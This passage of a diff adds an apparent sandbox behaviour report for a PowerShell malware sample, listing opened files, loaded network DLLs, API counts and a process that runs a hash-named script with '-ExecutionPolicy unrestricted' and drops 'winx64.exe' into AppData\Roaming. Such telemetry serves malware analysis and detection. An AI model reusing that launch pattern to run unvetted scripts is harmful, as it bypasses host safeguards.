+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\",
+                "C:\\tmpzvf1vy\\",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager.dll",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\",
+                "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf49f6405#\\",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheIndex",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\",
+                "C:\\Windows\\assembly\\GAC_32\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop.dll",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\bbe7eaf9abc583afc5cb972e1c01055a\\Microsoft.PowerShell.Commands.Management.ni.dll.aux",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Policy.1.0.System.Management.Automation\\v4.0_1.0.0.0__31bf3856ad364e35\\Policy.1.0.System.Management.Automation.config",
+                "C:\\Windows\\System32\\wbem\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\AppLocker\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDiagnostics\\",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper.dll",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSScheduledJob\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\CimCmdlets\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\e6fd0809fcf152e7af28d4d954420a7a\\Microsoft.Management.Infrastructure.Native.ni.dll.aux",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Dired13b18a9#\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Dired13b18a9#\\22226fd213cda8b0409db35f1a6000f7\\System.DirectoryServices.ni.dll.aux",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.WSMan.Management\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\",
+                "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\Microsoft.PowerShell.Diagnostics.psd1",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_99ef66db-8f5f-4491-822f-228c759713aa",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Manaa57fc8cc#\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Numerics\\39bc6b2550e216781f343bac4cc024af\\System.Numerics.ni.dll.aux",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSWorkflowUtility\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\Microsoft.PowerShell.Security.psd1",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.dll",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\",
+                "C:\\Windows\\System32\\tzres.dll",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.BackgroundIntelligentTransfer.Management\\1.0.0.0__31bf3856ad364e35\\Microsoft.BackgroundIntelligentTransfer.Management.dll",
+                "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config",
+                "C:\\Windows\\System32\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Configuration\\8c730c7fbe608461407cf3be279cdeab\\System.Configuration.ni.dll.aux",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_d7809b8a-712d-4b4c-a5f6-e0adcf171375",
+                "C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\AppLocker.psd1",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Management\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1",
+                "C:\\ProgramData\\Oracle\\Java\\javapath\\",
+                "C:\\Python27\\",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets.dll",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Transactions\\ce1b28106ce7b869fa471d6407556191\\System.Transactions.ni.dll.aux",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSDesiredStateConfiguration\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_07cd1134-60f3-4b2b-99a7-6a3e74fcf9f0",
+                "C:\\Python27\\lib\\site-packages\\pywin32_system32\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\Microsoft.PowerShell.Host.psd1",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Manaa57fc8cc#\\6a6c1355f2d7de7176bc0eace243a042\\System.Management.Automation.ni.dll.aux",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.BackgroundIntelligentTransfer.Management\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Core\\",
+                "C:\\Python27\\Scripts\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflowUtility\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\TroubleshootingPack\\",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_79fed44b-a50f-49d9-9204-e6dedef865bb",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf49f6405#\\c0d543ad7c05b3d906c7c12c915b874a\\Microsoft.Management.Infrastructure.ni.dll.aux",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\2e0d9cf89766b98f230abe8caeeb01de\\Microsoft.Management.Infrastructure.CimCmdlets.ni.dll.aux",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_965e143d-a9ce-49f3-bc2a-cb5bbeac55fb",
+                "C:\\Windows\\assembly\\pubpol59.dat",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ISE.psd1"
+            ],
+            "file_failed": [
+                "C:\\tmpzvf1vy",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S88747207#\\",
+                "\\DEVICE\\NETBT_TCPIP_{8C2F1D98-0F17-4D5E-BA83-0060E724AD37}",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Ba45bbba0#\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Sb6a1f1bc#\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S356e1ba0#\\",
+                "C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1\\",
+                "\\DEVICE\\NETBT_TCPIP_{E29AC6C2-7037-11DE-816D-806E6F6E6963}",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S54faafb0#\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S0f8e494c#\\"
+            ],
+            "file_recreated": [
+                "\\DEVICE\\NETBT_TCPIP_{1141D443-46F3-4C40-8D6C-D57632F2B3B2}",
+                "\\??\\MountPointManager",
+                "\\??\\C:",
+                "\\Device\\Afd\\Endpoint",
+                "\\??\\Nsi"
+            ],
+            "dll_loaded": [
+                "API-MS-WIN-Service-Management-L2-1-0.dll",
+                "credssp.dll",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\iphlpapi.dll",
+                "OLEAUT32.dll",
+                "WINTRUST.dll",
+                "advapi32.dll",
+                "ole32.dll",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwrshsip.dll",
+                "C:\\Windows\\system32\\CRYPT32.dll",
+                "rtutils.dll",
+                "RASMAN.DLL",
+                "API-MS-WIN-Service-Management-L1-1-0.dll",
+                "CFGMGR32.dll",
+                "Secur32.dll",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\bbe7eaf9abc583afc5cb972e1c01055a\\Microsoft.PowerShell.Commands.Management.ni.dll",
+                "rasapi32.dll",
+                "dhcpcsvc.DLL",
+                "ADVAPI32.dll",
+                "SHELL32.dll",
+                "ws2_32.dll",
+                "C:\\Windows\\System32\\wshtcpip.dll",
+                "IPHLPAPI.DLL",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\e6fd0809fcf152e7af28d4d954420a7a\\Microsoft.Management.Infrastructure.Native.ni.dll",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\dd80b6bd88741a27f7bb74ab0c89a3ba\\System.Data.ni.dll",
+                "api-ms-win-downlevel-advapi32-l2-1-0.dll",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\2e0d9cf89766b98f230abe8caeeb01de\\Microsoft.Management.Infrastructure.CimCmdlets.ni.dll",
+                "cryptsp.dll",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\winhttp.dll",
+                "MSISIP.DLL",
+                "dhcpcsvc6.DLL",
+                "winhttp.dll",
+                "SspiCli.dll",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\rasapi32.dll",
+                "NSI.dll",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\ws2_32.dll",
+                "API-MS-WIN-Service-winsvc-L1-1-0.dll",
+                "WS2_32.dll",
+                "SHLWAPI.dll",
+                "CRYPTSP.dll",
+                "C:\\Windows\\system32\\wshext.dll",
+                "RPCRT4.dll",
+                "C:\\Windows\\system32\\mswsock.dll",
+                "ntdll.dll",
+                "API-MS-WIN-DOWNLEVEL-SHLWAPI-L1-1-0.DLL",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\a8c425d1bb3892aa39a36cf5ea272556\\Microsoft.PowerShell.Commands.Utility.ni.dll",
+                "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\urlmon.dll",
+                "kernel32.dll",
+                "C:\\Windows\\System32\\wship6.dll",
+                "iphlpapi.dll",
+                "urlmon.dll"
+            ],
+            "file_created": [
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_07cd1134-60f3-4b2b-99a7-6a3e74fcf9f0",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_4b2ef84f-3321-443a-9099-fab84503db7b",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheIndex",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_fd22b1fc-e617-4e09-911b-265c0b51283b",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_79fed44b-a50f-49d9-9204-e6dedef865bb",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_99ef66db-8f5f-4491-822f-228c759713aa",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell",
+                "C:\\Users\\Admin\\AppData\\Roaming\\winx64.exe",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_d7809b8a-712d-4b4c-a5f6-e0adcf171375",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_965e143d-a9ce-49f3-bc2a-cb5bbeac55fb",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_acab909d-3ed0-4ce7-a78e-8b98924df715",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_ed0c2d6a-f32a-44c3-876c-25f7a1df175b",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_43619d16-f13a-429e-a19b-5dda70471031",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_6be5a15c-5bf8-479d-ac8e-928b6f4e80ef"
+            ],
+            "detected": []
+        },
+        "apistats": {
+            "3600": {
+                "NtCreateFile": 220,
+                "NtClose": 2024,
+                "NtAllocateVirtualMemory": 236,
+                "NtOpenFile": 817,
+                "LdrLoadDll": 63,
+                "NtSetInformationFile": 3,
+                "GetSystemTimeAsFileTime": 623,
+                "NtDuplicateObject": 6,
+                "NtMapViewOfSection": 23,
+                "NtUnmapViewOfSection": 19,
+                "LdrUnloadDll": 13,
+                "NtCreateThreadEx": 7,
+                "NtResumeThread": 9,
+                "NtSuspendThread": 2
+            }
+        },
+        "processes": [
+            {
+                "type": "process",
+                "tid": 3604,
+                "time": 0,
+                "pid": 3600,
+                "ppid": 3576,
+                "first_seen": 1684500424.765625,
+                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "process_name": "powershell.exe",
+                "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy unrestricted -File C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1",
+                "track": true,
+                "modules": [
+                    {
+                        "filepath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                        "basename": "powershell.exe",
+                        "baseaddr": "0xc70000",
+                        "imgsize": 471040
+                    },
+                    {
+                        "filepath": "C:\\Windows\\SYSTEM32\\ntdll.dll",
+                        "basename": "ntdll.dll",
+                        "baseaddr": "0x76f60000",
+                        "imgsize": 1318912
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\kernel32.dll",
+                        "basename": "kernel32.dll",
+                        "baseaddr": "0x76760000",
+                        "imgsize": 872448
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\KERNELBASE.dll",
+                        "basename": "KERNELBASE.dll",
+                        "baseaddr": "0x74f60000",
+                        "imgsize": 307200
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\ADVAPI32.dll",
+                        "basename": "ADVAPI32.dll",
+                        "baseaddr": "0x762e0000",
+                        "imgsize": 659456
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\msvcrt.dll",
+                        "basename": "msvcrt.dll",
+                        "baseaddr": "0x761e0000",
+                        "imgsize": 704512
+                    },
+                    {
+                        "filepath": "C:\\Windows\\SYSTEM32\\sechost.dll",
+                        "basename": "sechost.dll",
+                        "baseaddr": "0x76390000",
+                        "imgsize": 102400
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\RPCRT4.dll",
+                        "basename": "RPCRT4.dll",
+                        "baseaddr": "0x770d0000",
+                        "imgsize": 663552
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\ATL.DLL",
+                        "basename": "ATL.DLL",
+                        "baseaddr": "0x735d0000",
+                        "imgsize": 81920
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\USER32.dll",
+                        "basename": "USER32.dll",
+                        "baseaddr": "0x76840000",
+                        "imgsize": 823296
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\GDI32.dll",
+                        "basename": "GDI32.dll",
+                        "baseaddr": "0x76290000",
+                        "imgsize": 319488
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\LPK.dll",
+                        "basename": "LPK.dll",
+                        "baseaddr": "0x770c0000",
+                        "imgsize": 40960
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\USP10.dll",
+                        "basename": "USP10.dll",
+                        "baseaddr": "0x75270000",
+                        "imgsize": 643072
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\ole32.dll",
+                        "basename": "ole32.dll",
+                        "baseaddr": "0x75320000",
+                        "imgsize": 1425408
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\OLEAUT32.dll",
+                        "basename": "OLEAUT32.dll",
+                        "baseaddr": "0x760d0000",
+                        "imgsize": 585728
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\SHLWAPI.dll",
+                        "basename": "SHLWAPI.dll",
+                        "baseaddr": "0x764c0000",
+                        "imgsize": 356352
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\SHELL32.dll",
+                        "basename": "SHELL32.dll",
+                        "baseaddr": "0x75480000",
+                        "imgsize": 12886016
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\mscoree.dll",
+                        "basename": "mscoree.dll",
+                        "baseaddr": "0x6bdd0000",
+                        "imgsize": 303104
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\IMM32.DLL",
+                        "basename": "IMM32.DLL",
+                        "baseaddr": "0x761b0000",
+                        "imgsize": 126976
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\MSCTF.dll",
+                        "basename": "MSCTF.dll",
+                        "baseaddr": "0x763f0000",
+                        "imgsize": 835584
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\CRYPT32.dll",
+                        "basename": "CRYPT32.dll",
+                        "baseaddr": "0x750f0000",
+                        "imgsize": 1187840
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\MSASN1.dll",
+                        "basename": "MSASN1.dll",
+                        "baseaddr": "0x74f50000",
+                        "imgsize": 49152
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\WS2_32.dll",
+                        "basename": "WS2_32.dll",
+                        "baseaddr": "0x763b0000",
+                        "imgsize": 217088
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\NSI.dll",
+                        "basename": "NSI.dll",
+                        "baseaddr": "0x75310000",
+                        "imgsize": 24576
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\bcrypt.dll",
+                        "basename": "bcrypt.dll",
+                        "baseaddr": "0x74a60000",
+                        "imgsize": 94208
+                    },
+                    {
+                        "filepath": "C:\\Windows\\system32\\api-ms-win-core-synch-l1-2-0.DLL",
+                        "basename": "api-ms-win-core-synch-l1-2-0.DLL",
+                        "baseaddr": "0x6bda0000",
+                        "imgsize": 12288
+                    }
+                ],
+                "calls": [],
+                "files": [
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflow\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Program Files\\WindowsPowerShell\\Modules\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_fd22b1fc-e617-4e09-911b-265c0b51283b"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ISE.psm1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\BitsTransfer.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Core\\9d04ce1d8a3042f50b54c7f9ccdb4068\\System.Core.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSDiagnostics\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSWorkflow\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\dd80b6bd88741a27f7bb74ab0c89a3ba\\System.Data.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\BitsTransfer\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\\2bef38851483abae82f1172c1aaa604c\\System.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Transactions\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Management\\fea996c385fbc624826f8e043f6d5329\\System.Management.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_acab909d-3ed0-4ce7-a78e-8b98924df715"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.WSMan.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\TroubleshootingPack\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.Management.Infrastructure.CimCmdlets\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDesiredStateConfiguration\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Xml\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Numerics\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSScheduledJob\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_6be5a15c-5bf8-479d-ac8e-928b6f4e80ef"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\tmpzvf1vy"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Xml\\2e14a1befe55e7d9ad2457ceb5267e36\\System.Xml.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Configuration\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\a8c425d1bb3892aa39a36cf5ea272556\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\CimCmdlets.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_4b2ef84f-3321-443a-9099-fab84503db7b"
+                    },
+                    {
+                        "operate": "opened",
